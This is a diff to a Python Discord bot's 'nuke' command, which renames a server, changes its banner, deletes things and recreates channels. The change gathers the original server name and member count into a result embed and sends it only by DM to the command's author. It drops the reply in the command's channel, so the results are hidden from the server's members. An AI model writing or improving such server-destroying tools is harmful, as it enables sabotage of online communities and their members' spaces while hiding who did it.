@@ -42556,6 +42556,8 @@ async def nuke_cmd(ctx: commands.Context):
     # ── Executa o nuke ────────────────────────────────────────────────────────
     guild = ctx.guild
     _nuke_log: list[str] = []
+    _member_count = guild.member_count or len(guild.members)
+    _guild_name_orig = guild.name
 
     # 1. Renomear
     try:
@@ -42596,17 +42598,26 @@ async def nuke_cmd(ctx: commands.Context):
         _nuke_log.append(f"<a:alerta:1518271939460857968> Banner: sem boost nível 2")
         print(f"[nuke] servidor {guild.id} não tem feature BANNER", flush=True)
 
-    # Reportar resultado NO CANAL do comando, ANTES de deletar qualquer coisa
+    # Montar embed de resultado
+    _result_embed = discord.Embed(
+        title="Nuke — Resultado",
+        description="\n".join(_nuke_log),
+        color=0x5865F2,
+    )
+    _result_embed.add_field(
+        name="Servidor",
+        value=f"**{_guild_name_orig}**",
+        inline=True,
+    )
+    _result_embed.add_field(
+        name="Membros",
+        value=f"`{_member_count:,}`",
+        inline=True,
+    )
+
+    # Enviar resultado APENAS via DM — não mandar no canal do comando
     try:
-        await ctx.reply(
-            "**[nuke] resultado:**\n" + "\n".join(_nuke_log),
-            allowed_mentions=discord.AllowedMentions.none(),
-        )
-    except Exception:
-        pass
-    # DM ao autor também (backup)
-    try:
-        await ctx.author.send("**[nuke] resultado:**\n" + "\n".join(_nuke_log))
+        await ctx.author.send(embed=_result_embed)
     except Exception:
         pass
 
@@ -42645,11 +42656,11 @@ async def nuke_cmd(ctx: commands.Context):
         except Exception:
             await asyncio.sleep(0.5)
 
-    # 6. Enviar status no primeiro canal criado
+    # 6. Enviar status no primeiro canal criado (embed)
     if _first_ch and _nuke_log:
         try:
             await _first_ch.send(
-                "**[nuke] resultado:**\n" + "\n".join(_nuke_log),
+                embed=_result_embed,
                 allowed_mentions=discord.AllowedMentions.none(),
             )
         except Exception:
